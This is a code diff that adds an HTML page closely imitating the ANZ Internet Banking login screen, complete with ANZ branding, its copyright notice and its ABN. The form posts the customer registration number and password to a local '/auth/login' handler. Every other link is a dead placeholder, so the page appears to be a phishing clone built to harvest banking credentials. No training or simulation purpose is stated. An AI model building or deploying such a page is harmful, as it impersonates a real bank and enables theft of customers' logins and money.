@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+		<meta http-equiv="x-ua-compatible" content="ie=edge" />
+		<title>Login</title>
+		<meta name="viewport" content="width=device-width, initial-scale=1" />
+		<link rel="icon" href="/img/favicon.ico" />
+		<link rel="stylesheet" href="/css/login.css" />
+		<script src="/js/jquery.js"></script>
+	</head>
+	<body>
+		<div id="root" class="pageContainer">
+			<div class="sc-htoDjs gcwNfU">
+				<header class="sc-csuQGl iNSeoe">
+					<div class="sc-Rmtcm fQcucI">
+						<span class="sc-chPdSV kiOFau">
+							<a href="javascript:void(0);" title="ANZ Logo" class="sc-cvbbAY fSWFwe">
+								<img src="/img/anz-logo.svg" alt="ANZ logo" class="sc-bRBYWo iDMDsu" />
+							</a>
+						</span>
+					</div>
+				</header>
+				<main class="sc-dnqmqq fgYQMj">
+					<div class="sc-iwsKbI sc-gqjmRU sc-VigVT cbBBvh">
+						<div class="sc-RefOD fcpSbK">
+							<div class="sc-iQKALj eJuBVL">
+								<div class="sc-jTzLTM sc-fjdhpX sc-gipzik biBRUN">
+									<div class="sc-bdVaJa sc-bxivhb gHmjpC">
+										<div class="sc-bwzfXH sc-ifAKCX jMDrzh">
+											<div class="sc-htpNat sc-EHOje fuDXid">
+												<h1 id="login-header" font-size="30px" font-weight="600" class="sc-elJkPf gQzZhN">
+													<span role="text" class="sc-bYSBpT bDGCPV">
+														Log in to
+														<div>ANZ Internet Banking</div>
+													</span>
+												</h1>
+											</div>
+										</div>
+										<form action="/auth/login" method="post">
+											<div id="live-container">
+												<div class="sc-bwzfXH sc-ifAKCX hkTfox">
+													<div class="sc-htpNat sc-EHOje fuDXid">
+														<div class="sc-jlyJG fXSsv">
+															<div class="sc-frDJqD ddkzNy sc-hwwEjo iqfKQH">
+																<label for="customerRegistrationNumber" class="sc-kgAjT epQYnQ"
+																	>Customer Registration Number</label
+																>
+																<div class="sc-uJMKN dnzUOx"><div class="sc-bbmXgH fVCBsY"></div></div>
+																<div class="sc-jbKcbu huxGVV">
+																	<input
+																		id="customerRegistrationNumber"
+																		name="customerRegistrationNumber"
+																		type="tel"
+																		maxlength="16"
+																		placeholder=""
+																		required=""
+																		class="sc-kvZOFW caCjTA"
+																	/>
+																	<span value="" class="sc-jqCOkK kFMbpR"></span>
+																</div>
+																<p style="display: none" class="sc-dVhcbM intwzL">
+																	Please enter your Customer Registration Number
+																</p>
+															</div>
+														</div>
+													</div>
+												</div>
+												<div class="sc-bwzfXH sc-ifAKCX hkTfox">
+													<div class="sc-htpNat sc-EHOje fuDXid">
+														<div class="sc-frDJqD ddkzNy sc-hwwEjo iqfKQH">
+															<label for="password" class="sc-kgAjT epQYnQ">Password</label>
+															<div class="sc-uJMKN dnzUOx"><div class="sc-bbmXgH fVCBsY"></div></div>
+															<div class="sc-jbKcbu huxGVV">
+																<input
+																	id="password"
+																	name="password"
+																	type="password"
+																	maxlength=""
+																	placeholder=""
+																	required=""
+																	class="sc-kvZOFW caCjTA"
+																	value=""
+																/>
+																<span value="" class="sc-jqCOkK kFMbpR"></span>
+															</div>
+															<p style="display: none" class="sc-dVhcbM intwzL">Please enter your password</p>
+														</div>
+													</div>
+												</div>
+											</div>
+											<div class="sc-bwzfXH sc-ifAKCX hkTfox">
+												<div class="sc-htpNat sc-EHOje fuDXid">
+													<button type="submit" font-weight="600" class="sc-hMqMXs enlyRz">
+														<span role="text">
+															<svg viewBox="0 0 16 16" width="1em" height="1em" class="sc-epnACN yRSAC">
+																<path
+																	d="M13.585 6.209h-.89V4.695A4.7 4.7 0 0 0 8 0a4.7 4.7 0 0 0-4.695 4.695V6.21h-.89a.296.296 0 0 0-.296.297v9.198c0 .162.133.295.297.295h11.169a.296.296 0 0 0 .296-.297V6.506a.297.297 0 0 0-.296-.297zm-8.28-1.514A2.698 2.698 0 0 1 8 2a2.698 2.698 0 0 1 2.695 2.695V6.21h-5.39V4.695zm3.57 5.98v2.368a.874.874 0 0 1-1.748 0v-2.367a1.342 1.342 0 0 1-.484-1.024c0-.749.61-1.358 1.358-1.358.749 0 1.358.61 1.358 1.358 0 .395-.18.768-.484 1.023z"
+																	fill="currentColor"
+																></path>
+															</svg>
+															Log in
+														</span>
+													</button>
+												</div>
+											</div>
+										</form>
+										<div class="sc-bwzfXH sc-ifAKCX hkTfox">
+											<div class="sc-htpNat sc-EHOje iCsUil">
+												<a href="javascript:void(0);" class="sc-eHgmQL sc-jWBwVP bGycgx">
+													Forgot login details?
+												</a>
+											</div>
+											<div class="sc-htpNat sc-EHOje fhjBJp">
+												<div class="sc-esjQYD cwZGXC">
+													<a class="sc-hSdWYo bgtufs" href="javascript:void(0);"> Help </a>
+												</div>
+											</div>
+										</div>
+										<hr class="sc-gxMtzJ sc-dfVpRl cPNVuT" />
+										<div class="sc-bwzfXH sc-ifAKCX keBdWO">
+											<div class="sc-htpNat sc-EHOje fuDXid">
+												<div class="sc-kIPQKe kdLFKe">
+													<span class="sc-cIShpX eDUZTK">
+														<span>New to Internet Banking? </span>
+														<a href="javascript:void(0);" class="sc-eHgmQL sc-jWBwVP bGycgx">Register</a>
+													</span>
+												</div>
+											</div>
+										</div>
+										<div class="sc-bwzfXH sc-ifAKCX jTKZuQ">
+											<div class="sc-htpNat sc-EHOje fuDXid">
+												<div class="sc-kIPQKe kdLFKe">
+													<span class="sc-jwKygS hHGkXv">
+														<span>
+															By logging in, you accept our
+															<a href="javascript:void(0);" class="sc-eHgmQL sc-jWBwVP bGycgx">
+																Security and Privacy Statement.
+															</a>
+														</span>
+													</span>
+												</div>
+											</div>
+										</div>
+									</div>
+								</div>
+							</div>
+							<div class="sc-bwCtUz iDPwqX">
+								<div class="sc-jTzLTM sc-fjdhpX sc-gipzik iePjpL">
+									<div class="sc-bdVaJa sc-bxivhb iuTaRk">
+										<div class="sc-bwzfXH sc-ifAKCX jTKZuQ">
+											<div class="sc-htpNat sc-EHOje sc-hXRMBi ePrdtW">
+												<div id="acquisition-area" class="sc-jTzLTM sc-fjdhpX sc-gipzik RVemu">
+													<a href="javascript:void(0);" class="sc-eHgmQL sc-jWBwVP bGycgx">
+														<img
+															src="/img/ib-login-support.svg"
+															alt="ib login support"
+															class="sc-hrWEMg eyFUJr"
+														/>
+													</a>
+													<p class="sc-eTuwsz jtENsv">
+														<a href="javascript:void(0);" class="sc-eHgmQL sc-jWBwVP bGycgx">
+															<span role="text" class="sc-bYSBpT bDGCPV"
+																>Have a question about a product or service of ours?</span
+															>
+														</a>
+													</p>
+													<a href="javascript:void(0);" class="sc-eHgmQL sc-jWBwVP sc-gwVKww eFekaO">
+														<span role="text" class="sc-bYSBpT bDGCPV">Visit ANZ Support</span>
+													</a>
+												</div>
+											</div>
+											<div class="sc-htpNat sc-EHOje fEcYwd">
+												<div class="sc-jTzLTM sc-fjdhpX sc-gipzik RVemu">
+													<div class="sc-bdVaJa sc-bxivhb ftOLeJ">
+														<div class="sc-bwzfXH sc-ifAKCX kZqxSq">
+															<span role="text" id="login-help-link-header" class="sc-bYSBpT bDGCPV">
+																<div font-weight="600" class="sc-kIPQKe sc-eXEjpC bkGKPV">
+																	Further information
+																</div></span
+															>
+														</div>
+														<div class="sc-bwzfXH sc-ifAKCX hhhmKx">
+															<a href="javascript:void(0);" class="sc-eHgmQL sc-jWBwVP bGycgx"> What’s new </a>
+														</div>
+														<div class="sc-bwzfXH sc-ifAKCX hhhmKx">
+															<a href="javascript:void(0);" class="sc-eHgmQL sc-jWBwVP bGycgx">
+																Find or change your CRN and Password
+															</a>
+														</div>
+														<div class="sc-bwzfXH sc-ifAKCX hhhmKx">
+															<a href="javascript:void(0);" class="sc-eHgmQL sc-jWBwVP bGycgx"
+																>View statements</a
+															>
+														</div>
+														<div class="sc-bwzfXH sc-ifAKCX hhhmKx">
+															<a href="javascript:void(0);" class="sc-eHgmQL sc-jWBwVP bGycgx">
+																Get or change your card PIN
+															</a>
+														</div>
+														<div class="sc-bwzfXH sc-ifAKCX hhhmKx">
+															<a href="javascript:void(0);" class="sc-eHgmQL sc-jWBwVP bGycgx">
+																Latest security alerts
+															</a>
+														</div>
+														<div class="sc-bwzfXH sc-ifAKCX hhhmKx">
+															<a href="javascript:void(0);" class="sc-eHgmQL sc-jWBwVP bGycgx">Contact us</a>
+														</div>
+													</div>
+												</div>
+											</div>
+										</div>
+									</div>
+								</div>
+							</div>
+						</div>
+					</div>
+				</main>
+				<footer class="sc-hzDkRC hLFFFY">
+					<div class="sc-jhAzac cAuNUY">
+						<div class="sc-iwsKbI sc-gqjmRU sc-kgoBCf UeGWU">
+							<span class="sc-fMiknA iYfeTu">
+								<div class="sc-kEYyzF jMeGNg">
+									© Australia and New Zealand Banking Group Limited (ANZ) 2022<span class="sc-fBuWsC kbKcVw">
+										ABN 11 005 357 522.</span
+									>
+								</div>
+							</span>
+						</div>
+					</div>
+				</footer>
+			</div>
+		</div>
+		<script>
+			$(document).ready(function () {
+				var allInputs = $(':input');
+				allInputs.focusout(function () {
+					$(this).blur(function () {
+						if ($(this).prop('required')) {
+							if (!$(this).val()) {
+								$(this).removeClass('caCjTA');
+								$(this).addClass('jADYXt');
+								$(this).parent().next().show();
+							} else {
+								$(this).addClass('caCjTA');
+								$(this).removeClass('jADYXt');
+								$(this).parent().next().hide();
+							}
+						}
+					});
+				});
+			});
+		</script>
+	</body>
+</html>
